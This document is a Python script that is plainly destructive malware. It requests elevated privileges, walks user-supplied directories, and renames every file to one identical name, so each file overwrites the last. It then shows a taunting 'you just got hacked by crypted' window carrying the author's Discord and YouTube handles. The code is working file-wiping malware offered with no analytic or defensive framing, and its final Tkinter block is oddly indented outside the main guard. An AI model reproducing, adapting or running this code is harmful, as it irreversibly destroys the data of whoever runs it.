import os, concurrent.futures, platform, re, ctypes, sys
def is_admin():
    try:
        return os.getuid() == 0 if platform.system() != 'Windows' else ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) if platform.system() == 'Windows' else sys.exit("Root required")
class OSSettings:
    def __init__(self):
        self.system = platform.system()
        self.max_length = 255
        self.forbidden_chars = r'[\x00/]'
    def sanitize_name(self, name):
        return re.sub(self.forbidden_chars, '_', name)[:self.max_length]
os_settings = OSSettings()
def rename_file_task(file_info):
    root, file = file_info
    new_name = f"{os_settings.sanitize_name('crypted-pwned-you')}.{os_settings.sanitize_name('rgjhhwruifhwriughiwriruqhuiwrytuiwrghbsdkhewjfhwjhasgdbhjejiwiejefihrgiheivhbeigrfeggehugdferigbetuwvbfuiefvhbyuhek')}"
    src = os.path.join(root, file)
    dst = os.path.join(root, new_name)
    try: os.replace(src, dst)
    except:
        try:
            with open(src, 'rb') as f_src, open(dst, 'wb') as f_dst: f_dst.write(f_src.read())
            os.unlink(src)
        except: pass
def process_directory(directory):
    file_list = []
    for root, _, files in os.walk(directory, topdown=False):
        for file in files: file_list.append((root, file))
    return file_list
def mass_rename(directories):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(rename_file_task, sum([process_directory(d) for d in directories], []))
if __name__ == "__main__":
    mass_rename([os.path.abspath(d.strip()) for d in input().split(',')])
    import tkinter as tk
root = tk.Tk()
root.title("my bad bro")
label = tk.Label(root, text="you just got hacked by crypted, what are you gonna do now?", font=("Arial", 20))
label2 = tk.Label(root, text="discord: crypted.lol || youtube: c00lownzgg || ", font=("Arial", 20))
label.pack(padx=50, pady=50)
label2.pack(padx=50, pady=50)
root.mainloop()